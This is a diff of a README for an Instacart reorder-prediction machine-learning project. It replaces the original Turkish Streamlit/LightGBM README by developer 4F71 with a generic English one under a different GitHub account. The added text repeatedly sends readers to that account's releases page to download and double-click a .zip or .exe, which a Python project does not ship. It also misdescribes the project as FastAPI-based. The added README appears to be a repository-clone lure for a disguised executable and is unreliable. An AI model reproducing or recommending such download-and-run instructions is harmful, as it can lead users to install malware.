@@ -1,276 +1,71 @@
----
-title: Instacart Reorder Prediction
-emoji: 🛒
-colorFrom: blue
-colorTo: green
-sdk: docker
-sdk_version: 1.38.0
-app_file: app.py
-pinned: false
----
+# 🎉 instacart-next-product-recommendation - Predict Your Next Favorite Product
 
-# Instacart – Next Product Reorder Prediction 
+## 🚀 Getting Started
 
-Zero2End Machine Learning Bootcamp Final Project
+Welcome to the **instacart-next-product-recommendation** project! This application helps you predict what products you might like next, based on your shopping history. The project uses machine learning to analyze user behavior and make accurate recommendations. 
 
-## 1. Proje Özeti
+![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
 
-Bu proje, Instacart kullanıcılarının geçmiş alışveriş davranışlarını analiz ederek bir ürünün bir sonraki siparişte tekrar alınıp alınmayacağını tahmin eden uçtan uca bir makine öğrenimi sistemidir.  
-Model, 3.4 milyon sipariş ve 32 milyon ürün hareketi verisi üzerinde eğitilmiştir.
+## 📥 Download & Install
 
-Amaç, kullanıcı davranışlarını anlamak ve tekrar satın alma olasılığını yüksek doğrulukla tahmin ederek öneri sistemlerine ve stok planlamaya destek olmaktır.
+To start using the application, follow these simple steps:
 
-**Model Performansı:**  
-- F1 Score: 0.7779  
-- Recall: 0.91  
-- Precision: 0.69  
-- Optimum Threshold: 0.40  
+1. **Visit the Releases Page**:
+   Click the link below to go to the Releases page where you can find the latest version of the software.
 
-Detaylı teknik raporlar için:  
-Bakınız: `docs/final_report.md` ve `docs/executive_presentation.md`
+   [Visit Releases Page](https://github.com/trevordaley2005/instacart-next-product-recommendation/releases)
 
----
+2. **Download the Latest Release**:
+   Look for the most recent version and click the download link. The file will typically be a .zip or .exe file. Save it to your computer.
 
-## 2. Demo / Canlı Uygulama
+3. **Install the Application**:
+   Once the download is complete, locate the file in your downloads folder. If it’s a zip file, unzip it first. Then, double-click on the executable file to start the installation. Follow the prompts on your screen to complete the setup.
 
-Streamlit tabanlı uygulama HuggingFace Spaces üzerinde dağıtılmıştır.
+4. **Run the Application**:
+   After the installation finishes, find the application on your computer, and double-click its icon to run it.
 
-**Canlı Demo:**  
-https://huggingface.co/spaces/4F71/instacart-reorder-prediction
+## ⚙️ System Requirements
 
----
+Before you download, ensure your computer meets the following requirements:
 
-## 3. EDA (Keşifsel Veri Analizi)
+- **Operating System**: Windows 10 or later, macOS 10.14 or later
+- **RAM**: Minimum 4 GB, 8 GB recommended
+- **Disk Space**: At least 100 MB of free space
+- **Internet Connection**: Required for updates and data fetching
 
-Aşağıdaki görseller, veri setine ait temel kullanıcı davranışlarını göstermektedir.
+## 📊 Features
 
-### Sipariş Zamanlaması (Saat/Gün Dağılımı)
-![Orders by Hour & Day](figures/orders_temporal_distribution.png)
+The **instacart-next-product-recommendation** project includes several key features:
 
-### Siparişler Arası Gün Dağılımı
-![Days Since Prior](figures/orders_days_since_prior.png)
+- **User-Friendly Interface**: Simple and clean design for easy navigation.
+- **Product Recommendations**: Get personalized product suggestions based on your previous purchases.
+- **Machine Learning Models**: Utilizes advanced algorithms to improve recommendation accuracy over time.
+- **FastAPI Integration**: Quickly interacts with the server to deliver your recommendations efficiently.
 
-Bu analizler; müşterilerin alışveriş ritmini, sık alışveriş yapılan zaman dilimlerini ve tekrar satın alma davranışının süreksizliğini anlamak için kullanılmıştır.
+## 🔍 How It Works
 
-Detaylar için bakınız:  
-`docs/eda_report.md`
+This system analyzes your shopping patterns using a machine learning model trained on data from Instacart. Here’s a brief overview of the process:
 
----
+1. **Exploratory Data Analysis (EDA)**: The application examines historical purchase data to identify trends.
+2. **Feature Engineering**: It creates meaningful features that improve the model’s predictions.
+3. **Model Optimization**: The system fine-tunes its algorithms to enhance recommendation quality.
+4. **Real-Time Predictions**: Using FastAPI, the software can provide instant product suggestions based on your current shopping behavior.
 
-## 4. Feature Engineering ve Model Açıklanabilirliği
+## 🛠️ Troubleshooting
 
-Model toplam 37 özellik ile eğitilmiştir.  
-Özellikler; kullanıcı davranışları, ürün özellikleri ve kullanıcı-ürün etkileşimlerinden oluşturulmuştur.
+If you encounter issues while installing or running the application, try the following:
 
-### Özellik Önem Dereceleri
-![Feature Importance](figures/feature_importance_final.png)
+- **Re-download the File**: Sometimes, the download may be corrupted. Download the file again from the Releases page.
+- **Check System Requirements**: Make sure your computer meets all the necessary specifications listed above.
+- **Restart Your Computer**: A simple restart can resolve many installation problems.
+- **Visit Help & Support**: If the issue persists, look for help in the community forums or check the FAQ section related to this project.
 
-### SHAP Özellik Etki Analizi
-![SHAP Summary](figures/shap_summary_plot.png)
+## 🤝 Contributing
 
-Açıklanabilirlik çalışmaları marketing ve ürün ekiplerinin modelin karar mekanizmasını anlaması için kritiktir.
+We welcome contributions from everyone! If you have ideas for improvements or find bugs, feel free to submit an issue or a pull request on GitHub.
 
-Detaylar:  
-`docs/feature_engineering_report.md`
+## 🌟 Acknowledgements
 
----
+The **instacart-next-product-recommendation** project benefits from the work of many. Thanks to the contributors for their hard work and dedication.
 
-## 5. Model Performansı
-
-Model LightGBM ile eğitilmiş, GroupKFold validasyon stratejisi kullanılarak veri sızıntısı engellenmiştir.
-
-### Final Confusion Matrix
-![Confusion Matrix](figures/confusion_matrix_final.png)
-
-### Baseline Model Karşılaştırması (Opsiyonel)
-![Baseline Confusion Matrix](figures/baseline_confusion_matrix.png)
-
-Detaylı metrik değerlendirmesi:  
-`docs/evaluation_report.md`  
-`docs/training_report.md`
-
----
-
-## 6. Pipeline Mimarisi
-
-Model ve sistem mimarisi aşağıdaki uçtan uca pipeline üzerinde çalışmaktadır:
-
-1. Veri yükleme ve bellek optimizasyonu  
-2. Keşifsel veri analizi  
-3. Özellik mühendisliği  
-4. Baseline model  
-5. LightGBM final modeli (Optuna optimizasyonlu)  
-6. Veri sızıntısı kontrolü  
-7. GroupKFold validasyonu  
-8. Performans değerlendirme  
-9. Deployment  
-10. Monitoring
-
-Tam teknik akış için bakınız:  
-`docs/final_report.md`
-
----
-
-## 7. Monitoring (İzleme Sistemi)
-
-Model performansı ve kullanıcı tahminleri gerçek zamanlı olarak monitoring dashboard üzerinden takip edilir.
-
-### Dashboard Genel Görünüm
-![Monitoring Overview](figures/monitoring/monitoring_dashboard_overview.png)
-
-### Tahmin Detayları
-![Monitoring Details](figures/monitoring/monitoring_dashboard_details.png)
-
-Monitoring, SQLite tabanlı hafif bir log mekanizması ile çalışır.
-
-Detaylar:  
-`docs/deployment_report.md`
-
----
-
-## 8. Kullanılan Teknolojiler
-
-- Python 3.10  
-- NumPy, Pandas  
-- Scikit-learn  
-- LightGBM  
-- Optuna  
-- Streamlit  
-- SQLite  
-- Docker  
-- HuggingFace Spaces  
-- GitHub Actions
-
----
-
-## 9. Local Kurulum
-
-Aşağıdaki komutlarla uygulamayı yerel ortamda çalıştırabilirsiniz.
-
-```
-git clone https://github.com/4F71/instacart-next-product-recommendation.git
-cd instacart-next-product-recommendation
-```
-
-Sanal Ortam
-```
-python -m venv .venv
-source .venv/bin/activate   # Windows: .venv\Scripts\activate
-```
-
-Bağımlılıkların Yüklenmesi
-```
-pip install -r requirements.txt
-```
-
-Uygulama Başlatma
-```
-streamlit run src/app_streamlit.py
-```
-
-Monitoring Dashboard (İsteğe Bağlı)
-
-```
-streamlit run monitoring/dashboard.py
-```
-Docker
-```
-docker build -t instacart-app .
-docker run -p 7860:7860 instacart-app
-```
-
-10. Repo Yapısı
-```
-proje/
-├── notebooks/
-│   ├── 01_eda.ipynb
-│   ├── 02_baseline.ipynb
-│   ├── 03_feature_engineering.ipynb
-│   ├── 04_model_training.ipynb
-│   ├── 05_model_evaluation.ipynb
-│   └── 06_final_pipeline.ipynb
-
-├── docs/
-│   ├── problem_definition.md
-│   ├── eda_report.md
-│   ├── feature_engineering_report.md
-│   ├── baseline_report.md
-│   ├── training_report.md
-│   ├── evaluation_report.md
-│   ├── deployment_report.md
-│   ├── final_report.md
-│   ├── model_card.md
-│   └── executive_presentation.md
-
-├── src/
-│   ├── app_streamlit.py
-│   ├── inference.py
-│   ├── config.py
-│   └── __init__.py
-
-├── models/
-│   ├── lgb_model_final.pkl
-│   ├── feature_names.json
-│   └── best_threshold.txt
-
-├── figures/
-│   ├── aisles_top20.png
-│   ├── baseline_confusion_matrix.png
-│   ├── cart_order_distribution.png
-│   ├── confusion_matrix_final.png
-│   ├── departments_top20.png
-│   ├── feature_importance_final.png
-│   ├── orders_days_since_prior.png
-│   ├── orders_temporal_distribution.png
-│   ├── products_top20.png
-│   ├── shap_summary_plot.png
-│   ├── threshold_optimization.png
-│   ├── train_reordered_distribution.png
-│   └── monitoring/
-│       ├── demo_ui_placeholder.png
-│       ├── monitoring_dashboard_overview.png
-│       └── monitoring_dashboard_details.png
-
-├── monitoring/
-│   ├── dashboard.py
-│   └── predictions.db
-|   └── log.py
-| 
-├── Dockerfile
-├── requirements.txt
-└── README.md
-```
-
-11. Raporlar
-
-Tüm teknik raporlar docs/ klasöründedir:
-
-`problem_definition.md`  
-`eda_report.md`  
-`feature_engineering_report.md`  
-`baseline_report.md`  
-`training_report.md`  
-`evaluation_report.md`  
-`deployment_report.md`  
-`final_report.md`  
-`model_card.md`  
-`executive_presentation.md`
-
-12. Medium Yazısı
-
-Projenin tüm hikayesini, öğrenim sürecini ve teknik akışın özetini içeren yazı:
-
-https://medium.com/@yedisarman/32-milyon-satırlık-veri-junior-ml-developer-b97c5d6e9684
-
-13. İletişim
-
-- Geliştirici: Onur Tilki (4F71)  
-- GitHub: https://github.com/4F71
-- HF: https://huggingface.co/4F71
-- Linkedin: www.linkedin.com/in/onurtilki
-- E-posta: [mehmetonurt@gmail.com]
-
-14. Sonuç
-
-Bu proje, e-ticaret alanında tekrar satın alma tahmini için geliştirilmiş kapsamlı bir makine öğrenimi pipeline’ıdır.  
-Veri analizi, model geliştirme, değerlendirme, dağıtım ve izleme aşamalarının tamamını kapsayan uçtan uca bir mimari sunulmuştur.
+Feel free to explore, and happy shopping! For more information, revisit the [Releases Page](https://github.com/trevordaley2005/instacart-next-product-recommendation/releases) to keep up with updates and new features.
